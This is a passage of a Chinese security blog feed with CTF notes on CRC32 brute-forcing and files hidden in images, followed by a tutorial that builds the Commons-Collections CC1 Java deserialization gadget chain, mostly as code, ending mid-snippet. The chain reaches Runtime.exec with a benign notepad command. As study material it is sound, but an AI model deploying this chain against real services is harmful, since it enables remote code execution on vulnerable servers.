miscmisc</p><h2 id="CRC32碰撞"><a href="#CRC32碰撞" class="headerlink" title="CRC32碰撞"></a>CRC32碰撞</h2><p>CRC“冗余校验码”，CRC32则表示会产生一个32bit（8位十六进制数）的校验值<br>在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理如果<strong>文件字节长度比较短</strong>的话，可以尝试CRC32爆破</p><p>碰撞脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf=<span class="number">8</span></span><br><span class="line"><span class="keyword">import</span> <span class="type">binascii</span></span><br><span class="line"><span class="variable">real</span> <span class="operator">=</span> <span class="number">0x56EA988D</span></span><br><span class="line"><span class="keyword">for</span> y in <span class="title function_">range</span><span class="params">(<span class="number">1000</span>,<span class="number">9999</span>)</span>:</span><br><span class="line">    <span class="keyword">if</span> real == (binascii.crc32(str(y)) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">        print(y)</span><br><span class="line">print(<span class="string">&#x27;End&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>在 Python 2.x 的版本中，binascii.crc32 所计算出來的 CRC 值域为[-2^31, 2^31-1] 之间的有符号整数，为了要与一般CRC 结果作比对，需要将其转为无符号整数，所以加上&amp; 0xffffffff来进行转换</li><li>在 Python 3.x 的版本中，其计算结果为 [0, 2^32-1] 间的无符号整数，因此不需额外加上&amp; 0xffffffff</li></ul><h2 id="进制转换隐藏信息"><a href="#进制转换隐藏信息" class="headerlink" title="进制转换隐藏信息"></a>进制转换隐藏信息</h2><p>当发现开头是PK的时候，说明是ZIP文件，进行进制转换，再用winhex保存为zip</p><p><img src="1663687425119-fa5cfabb-b182-462a-9f60-7195a28ebcfe.png" alt="img"></p><h2 id="图片中隐藏压缩包"><a href="#图片中隐藏压缩包" class="headerlink" title="图片中隐藏压缩包"></a>图片中隐藏压缩包</h2><p>以jpg格式的图片为例</p><ul><li>一个完整的 JPG 文件由 FF D8 开头，FF D9结尾</li><li>图片浏览器会忽略 FF D9 以后的内容</li><li>因此可以在 JPG 文件中加入其他文件</li></ul><p>用kali的binwalk指令</p><p><img src="1663687451882-8df8003e-e43a-451d-9fec-565dcdd23630.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-CC1</title>
      <link href="/2022/09/19/JAVA-CC1/"/>
      <url>/2022/09/19/JAVA-CC1/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="1-CC"><a href="#1-CC" class="headerlink" title="1.CC"></a>1.CC</h2><p>Commons-Collections，为Java标准的Collections API提供了相当好的补充，对其常用的数据结构操作进行了很好的封装和抽象，保证性能的同时大大简化代码。</p><p>此包的类包含下面两个：</p><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p>Commons Collections在java.util.Map的基础上扩展了很多接口和类，比较有代表性的是BidiMap、MultiMap和LazyMap。跟Bag和Buffer类似，Commons Collections也提供了一个MapUtils。</p><p><strong>BidiMap</strong>，直译就是双向Map，可以通过key找到value，也可以通过value找到key，注意key与value均不能重复。</p><p><strong>MultiMap</strong>，就是说一个key不再是简单的指向一个对象，而是一组对象，add()和remove()的时候跟普通的Map无异，只是在get()时返回一个Collection，利用MultiMap，我们就可以很方便的往一个key上放数量不定的对象，也就实现了一对多。</p><p><strong>LazyMap</strong>，意思就是这个Map中的键&#x2F;值对一开始并不存在，当被调用到时才创建。</p><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>我们有时候需要将某个对象转换成另一个对象供另一组方法调用，而这两类对象的类型有可能并不是出于同一个继承体系的，或者说出了很基本的Object之外没有共同的父类，或者我们根本不关心他们是不是有其他继承关系，甚至就是同一个类的实例只是对我们而言无所谓，我们为了它能够被后续的调用者有意义的识别和处理，在这样的情形，我们就可以利用Transformer。除了基本的转型Transformer之外，Commons Collections还提供了Transformer链和带条件的Transformer，使得我们很方便的组装出有意义的转型逻辑。 </p><p><a href="https://blog.csdn.net/liliugen/article/details/83298363">https://blog.csdn.net/liliugen/article/details/83298363</a></p><h2 id="2-环境"><a href="#2-环境" class="headerlink" title="2.环境"></a>2.环境</h2><p>CC包版本需要为3.1-3.2.1(3.0可能弹不出记事本)，jdk7(jdk8可能会出错)</p><p><img src="1663580079897-9645f203-d5bd-4a77-9f13-b3e370bb7d1e.png" alt="img"></p><h2 id="3-构造攻击面"><a href="#3-构造攻击面" class="headerlink" title="3.构造攻击面"></a>3.构造攻击面</h2><h3 id="3-1踩坑记录"><a href="#3-1踩坑记录" class="headerlink" title="3.1踩坑记录"></a>3.1踩坑记录</h3><p>首先熟悉一下4个类的transform</p><h4 id="3-1-1InvokerTransformer"><a href="#3-1-1InvokerTransformer" class="headerlink" title="3.1.1InvokerTransformer"></a>3.1.1InvokerTransformer</h4><p>反射机制触发函数InvokerTransformer类的transform(Object input)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName; <span class="comment">//函数名</span></span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes; <span class="comment">//函数参数的类型</span></span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;             <span class="comment">//参数对象</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();     <span class="comment">//获取input的类</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes); <span class="comment">//调用方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);              <span class="comment">//执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1663582061286-48f9b292-bcf5-480a-84dc-6984cf89491c.png" alt="img"></p><p>通过Java反射机制，我们可以构造一个命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//payload</span></span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务端</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">d</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line">    x.transform(d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可看出要想实现命令执行，关键是要在服务端具备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object d = Class.forName(“java.lang.Runtime”).getMethod(“getRuntime”).invoke(Class.forName(“java.lang.Runtime”))</span><br></pre></td></tr></table></figure><h4 id="3-1-2-ChainedTransformer"><a href="#3-1-2-ChainedTransformer" class="headerlink" title="3.1.2.ChainedTransformer"></a>3.1.2.ChainedTransformer</h4><p>接下来我们看这个类ChainedTransformer的transform函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">    object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此函数可知，输入的对象会给第一个转化器，转换结果会被输入到第二个转换器，以此类推。</p><p>再看ChainedTransformer类的构造函数，发现iTransformers数组是用户自己定义的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>构造一下，运行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//payload</span></span><br><span class="line">        Transformer[] x = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(x);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line">        d.transform(a);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可得知和InvokerTransformer没区别，其实就是做铺垫</p><h4 id="3-1-3-ConstantTransformer"><a href="#3-1-3-ConstantTransformer" class="headerlink" title="3.1.3.ConstantTransformer"></a>3.1.3.ConstantTransformer</h4><p>ConstantTransformer类与InvokkerTransformer一样，继承Transforme父类，可以进入数组。主要看该类的下面两个函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此对其修改，由于Runtime.getRuntime()实例已经放进payload里面，transform函数有无参数都不重要，因为ConstantTransformer类的transform函数会返会iConstant值，也就是最开始我们构造函数设置好的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//payload</span></span><br><span class="line">        Transformer[] x = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(x);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，当作网络传输</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">        fout.writeObject(d);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(f1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">a</span> <span class="operator">=</span> (ChainedTransformer) f2.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        d.transform(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果这样写，会报错，因为Runtime类的定义没有继承Serializable类，是不支持反序列化的。</p><p><img src="1663583336107-dab7f856-c687-4664-b30c-90e9ca4e0ae9.png" alt="img"></p><h4 id="3-1-4-服务端生产runtime实例"><a href="#3-1-4-服务端生产runtime实例" class="headerlink" title="3.1.4.服务端生产runtime实例"></a>3.1.4.服务端生产runtime实例</h4><p>Runtime的实例是通过Runtime.getRuntime()来获取的，而InvokerTransformer里面的反射机制可以执行任意函数，我们让其执行getRuntime，从而使其成为实例。</p><p>把数组修改成如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] x = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>会报错，原因是类，所以input.getClass获取的是java.lang.Class。</p><p><img src="1663584538635-a9f108da-a36c-432a-a341-f20d6f73cb6f.png" alt="img"></p><p><img src="1663584503721-75b7c124-ff6a-498a-82b7-f5cec663c623.png" alt="img"></p><p>调整一下，借用getMethod方法执行getRuntime。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] x = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;)</span><br><span class="line">         &#125;;</span><br></pre></td></tr></table></figure><p>跟踪到x[1]进去transform函数，发现获取的类还不是Runtime实例。</p><p><img src="1663584608671-23e7c172-730d-4ee5-a875-24e0b0a0b504.png" alt="img"></p><p>再对其调整：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] x = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>就可以了</p><p>实质等同于反射语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//x[0],object=&quot;&quot;</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">s</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Class&quot;</span>);</span><br><span class="line">        <span class="comment">//x[1],object=&quot;java.lang.Runtime&quot;</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> s.getMethod(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>), <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(o + <span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        <span class="comment">//x[2],object=&quot;java.lang.Runtime.getRuntime()&quot;</span></span><br><span class="line">        s = o.getClass();</span><br><span class="line">        o = s.getMethod(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;).invoke(o, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(s + <span class="string">&quot;\n&quot;</span> + o + <span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        <span class="comment">//x[3],object=</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line">        System.out.println(o1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1663584838063-3f28bf32-5d18-487d-93b8-35acd980b945.png" alt="img"></p><p>可以看出，O和O1结果是一样的，但是服务端应该也不会执行。</p><h3 id="3-2-最终方法-MAP"><a href="#3-2-最终方法-MAP" class="headerlink" title="3.2.最终方法-MAP"></a>3.2.最终方法-MAP</h3><p>经过上面的踩坑之后，使用map，有两种Map都可以实现，一种是TransformedMap，另一种LazyMap，ysoserial用的是第二种</p><h4 id="3-2-1-TransformedMap"><a href="#3-2-1-TransformedMap" class="headerlink" title="3.2.1.TransformedMap"></a>3.2.1.TransformedMap</h4><p>有两种方法，一种是直接利用TransformedMap类进行修改，另一种是利用AnnotationInvocationHandler的readObject复写点</p><h5 id="3-2-1-1-基础修改版"><a href="#3-2-1-1-基础修改版" class="headerlink" title="3.2.1.1.基础修改版"></a>3.2.1.1.基础修改版</h5><p>首先，看下TransformedMap类，发现当该类在调用put函数时，会执行transform函数，最后的执行结果会被添加到Map里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.keyTransformer == <span class="literal">null</span> ? object : <span class="built_in">this</span>.keyTransformer.transform(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer == <span class="literal">null</span> ? object : <span class="built_in">this</span>.valueTransformer.transform(object);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = <span class="built_in">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="built_in">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test1</span> <span class="keyword">implements</span> <span class="title class_">Test</span>, Transformer &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test2</span> <span class="keyword">implements</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;d&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        System.out.println(innerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="keyword">new</span> <span class="title class_">Test1</span>(), <span class="keyword">new</span> <span class="title class_">Test2</span>());</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        System.out.println(map);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Map输出为{x&#x3D;d}。</p><p><img src="1663585031571-0f94843d-dde1-4a13-befc-39835195343a.png" alt="img"></p><p>修改一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title 